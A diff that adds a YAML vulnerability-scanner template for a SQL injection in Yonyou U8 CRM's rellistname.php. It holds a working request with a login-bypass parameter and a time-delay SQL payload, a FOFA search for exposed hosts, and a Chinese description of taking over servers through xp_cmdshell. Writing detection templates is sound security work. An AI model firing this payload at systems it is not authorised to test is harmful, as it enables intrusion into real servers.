@@ -1,0 +1,28 @@
+id: yonyou-u8-crm-rellistname-sqli
+
+info:
+  name: UFIDA U8 CRM rellistname.php - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    用友U8+CRM系统rellistname.php存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="用友U8CRM"
+  tags: 用友-U8-CRM
+
+http:
+  - raw:
+      - |
+        GET /config/rellistname.php?DontCheckLogin=1&objType=1&reportID=1+wAiTFOR+DeLAy'0:0:4'--+- HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+          - contains(body, "用友U8CRM")
+          - status_code == 200
+        condition: and
